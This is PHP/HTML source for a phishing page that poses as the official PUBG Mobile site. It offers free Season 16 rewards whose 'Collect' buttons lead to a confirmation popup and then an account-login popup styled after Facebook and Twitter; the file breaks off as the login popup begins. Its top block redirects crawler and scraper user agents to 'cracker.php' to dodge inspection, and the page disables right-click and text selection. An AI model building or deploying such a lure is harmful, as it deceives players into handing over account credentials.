<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container rewards_home">
<div class="container-mask">
<!--- navbar --->
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div>
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>OFFICIAL PUBG ON MOBILE</span>
</div>
</div>
<!--- navbar --->
<!--- content --->
<div class="content">
<div class="btn-share">Share</div>
<!---- logo-wrapper --->
<div class="logo-wrapper">
<img src="https://i.ibb.co/0jZX3yd/season.png">
<div class="txt-season">Royale Pass Season 16</div>
<div class="txt-subseason"><span>Metro Exodus</span></div>
</div>
<!--- logo-wrapper --->
<!--- landing-content --->
<div class="landing-content">
<div class="landing-content-title">Season 16 Has Arrived <i class="fa fa-bell-o"></i></div>
<div class="landing-content-desc">
Welcome to PUBG MOBILE: Royale Pass Season 16!
<br>
Collect various kinds of attractive rewards in this new season
<br>
<br>
Various kinds of free gifts are waiting for you to collect
<br>
Come on, collect your favorite rewards right now and this event is free of charge!
</div>
</div>
<!--- landing-content --->
<button type="button" class="btn-landing" onclick="open_rewards_list()">Collect Rewards</button>
</div> <!--- content --->
</div> <!--- container-mask --->
</div> <!--- container --->


<div class="popup rewards_list animated fadeIn" style="display: none;">
<div class="container">
<div class="container-mask">
<!--- navbar --->
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div>
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>OFFICIAL PUBG ON MOBILE</span>
</div>
</div>
<!--- navbar --->
<!--- content --->
<div class="content">
<div class="menu-rewards kanan" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-rewards kiri" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-rewards tengah" onclick="openRewards(event, 'season');">Season Reward</div>

<div class="tab_rewards animated fadeIn" id="latest">
<div class="alert-rewards">
Choose the latest rewards for you and collect it
<i class="fa fa-bell-o"></i>
</div>
<div class="scroll">
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cYFCXZr/3.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/cYFCXZr/3.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sv0H10J/1.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/sv0H10J/1.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BKqxG1z/2.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/BKqxG1z/2.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6tTTZV/6.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/c6tTTZV/6.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/599Jp1X/4.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/599Jp1X/4.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9NjQ2Mx/5.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/9NjQ2Mx/5.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JqbrTY3/9.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/JqbrTY3/9.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/10fqzy3/7.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/10fqzy3/7.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/F6NSD1c/8.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/F6NSD1c/8.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZGXhYxY/12.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/ZGXhYxY/12.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QjDy7Xj/10.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/QjDy7Xj/10.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jD5Bvmb/11.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/jD5Bvmb/11.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdC5zHF/5.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mTpf1bz/3.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pd4MrC6/4.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wwCwgFX/6.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sVkDgf7/8.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/7v7cDFb/9.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0mK0Kkm/1.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/0mK0Kkm/1.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/x70Zv58/2.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/x70Zv58/2.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SfsVZj3/3.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/SfsVZj3/3.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VgpfgHx/4.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/VgpfgHx/4.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m8swBsJ/5.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/m8swBsJ/5.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mqswmqy/6.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/mqswmqy/6.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzBCPj0/7.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/mzBCPj0/7.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/RBm3cZg/8.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/RBm3cZg/8.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GkxtWsH/9.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/GkxtWsH/9.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/vDzhn4G/10.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/vDzhn4G/10.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hV80jRJ/11.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/hV80jRJ/11.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TM4x8kF/12.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/TM4x8kF/12.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3s4VjWb/13.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/3s4VjWb/13.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hyMFJVy/14.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/hyMFJVy/14.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fb4WYn9/15.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Fb4WYn9/15.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wgC8DFJ/16.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/wgC8DFJ/16.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/z7tRFnK/17.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/z7tRFnK/17.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mSR83ZX/18.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/mSR83ZX/18.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/r01vx8L/19.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/r01vx8L/19.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BzkrJPx/20.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/BzkrJPx/20.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KKsqN8c/21.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/KKsqN8c/21.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Ms6xmw1/22.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Ms6xmw1/22.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nszjrmK/23.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/nszjrmK/23.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C8XSXtp/24.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/C8XSXtp/24.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XFvVdkm/25.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/XFvVdkm/25.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/42KvPQD/26.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/42KvPQD/26.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PztSxRq/27.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/PztSxRq/27.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c1dyKJX/28.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/c1dyKJX/28.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SQctySW/29.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/SQctySW/29.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HhxqcZy/30.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/HhxqcZy/30.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BG71Lq8/1.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/BG71Lq8/1.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cYLYRnF/2.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/cYLYRnF/2.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Kmzt1kv/3.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Kmzt1kv/3.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ySj37hj/4.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/ySj37hj/4.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/kh4gdrP/5.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/kh4gdrP/5.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZBrkgM8/6.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/ZBrkgM8/6.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngP07s9/7.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/ngP07s9/7.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HGTx2s3/8.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/HGTx2s3/8.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzb2f6V/9.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/mzb2f6V/9.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QHRMWMg/10.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/QHRMWMg/10.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/G9M0Bvm/11.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/G9M0Bvm/11.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wMD34vP/12.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/wMD34vP/12.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwWc8V7/13.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/cwWc8V7/13.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0QtCjnz/14.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/0QtCjnz/14.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g9zWGn4/15.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/g9zWGn4/15.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/MnM6Qdp/16.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/MnM6Qdp/16.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rg2thNY/17.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Rg2thNY/17.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VQtZ0sH/18.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/VQtZ0sH/18.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/j3K6DSC/19.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/j3K6DSC/19.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WVQrH9j/20.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/WVQrH9j/20.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SrWTVzr/21.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/SrWTVzr/21.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YPXLK1h/22.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/YPXLK1h/22.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GWGX9DZ/23.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/GWGX9DZ/23.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Q8F2nX9/24.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Q8F2nX9/24.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Z6KDLDN/25.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Z6KDLDN/25.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N102xm6/26.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/N102xm6/26.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwJRtR3/27.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/cwJRtR3/27.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/5x1w88X/28.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/5x1w88X/28.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/R0rQvw4/29.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/R0rQvw4/29.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/27fMpPf/30.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/27fMpPf/30.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cTcRJCZ/31.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/cTcRJCZ/31.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WPFTmgN/32.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/WPFTmgN/32.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h8n8jN/33.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/0h8n8jN/33.jpg">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3WdQMkQ/34.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/3WdQMkQ/34.jpg">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n6KkVTX/35.jpg">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/n6KkVTX/35.jpg">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pWR4WQ1/36.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/pWR4WQ1/36.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6DmJkWp/37.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/6DmJkWp/37.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sT1w13/38.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/9sT1w13/38.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQtBL6z/39.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/PQtBL6z/39.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Gk99ZQY/40.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/Gk99ZQY/40.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/P44sdBP/41.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/P44sdBP/41.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0MhX7pL/42.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/0MhX7pL/42.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6PYCWg/43.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/c6PYCWg/43.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qsw53N6/44.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/qsw53N6/44.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rQ7NY9z/45.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/rQ7NY9z/45.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X3CBhhv/46.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/X3CBhhv/46.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KLQY3Vg/47.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/KLQY3Vg/47.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nMmZ2Rc/48.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/nMmZ2Rc/48.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XS1D33m/49.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/XS1D33m/49.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQNxt7B/50.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="https://i.ibb.co/PQNxt7B/50.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab --->

<div class="tab_rewards animated fadeIn" id="season">
<div class="alert-rewards">
Choose the season rewards for you and collect it
<i class="fa fa-bell-o"></i>
</div>
<div class="scroll">
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/1.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/1.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/2.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/2.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/3.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/3.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/4.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/4.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/5.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/5.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/6.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/6.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/7.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/7.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/8.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/8.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/9.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/9.png">Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/10.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/10.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/11.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/11.png">Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/12.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/12.png">Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/13.png">
<button type="button" onclick="open_rewards_confirmation(this)" src="img/reward/season/13.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab --->

<div class="tab_rewards animated fadeIn" id="other">
<script type="text/javascript">
function buka(nama) {
$("#konten").html('<div class="load-item"><i class="zmdi zmdi-spinner zmdi-hc-spin"></i><br>Please wait...</div>');
	$.ajax({
		url	: nama+'.php',
		type	: 'GET',
		dataType: 'html',
		success	: function(isi){
			$("#konten").html(isi);
		},
	});
}

</script>
<div id="konten">
<?php include 'pages/weapon.php';?>
</div>
</div> <!--- tab --->
</div> <!--- content --->
</div> <!--- container-mask --->
</div> <!--- container --->
</div> <!--- popup --->

<div class="popup-confirm-wrapper rewards_confirmation animated fadeIn" style="display: none;">
<div class="popup-confirm">
<div class="popup-confirm-navbar">
<i class="zmdi zmdi-close-circle" onclick="close_rewards_confirmation()"></i>
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="popup-confirm-navbar-txt-game">
PUBG MOBILE
<span>REWARDS CONFIRMATION</span>
</div> <!--- popup-confirm-navbar-txt-game --->
</div> <!--- popup-confirm-navbar --->
<div class="popup-confirm-content">
<div class="popup-confirm-alert">
<i class="zmdi zmdi-help-outline"></i>
Are you sure to collect this rewards?
</div> <!--- popup-confirm-alert --->
<img src="" id="got">
<button type="button" onclick="open_account_login()">Yes, collect now</button>
</div> <!--- popup-confirm-content --->
</div> <!--- popup confirm --->
</div> <!--- popup --->

<div class="popup-confirm-wrapper account_login animated fadeIn" style="display: none;">
<div class="popup-confirm">
<div class="popup-confirm-navbar">
<i class="zmdi zmdi-close-circle" onclick="close_account_login()"></i>
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
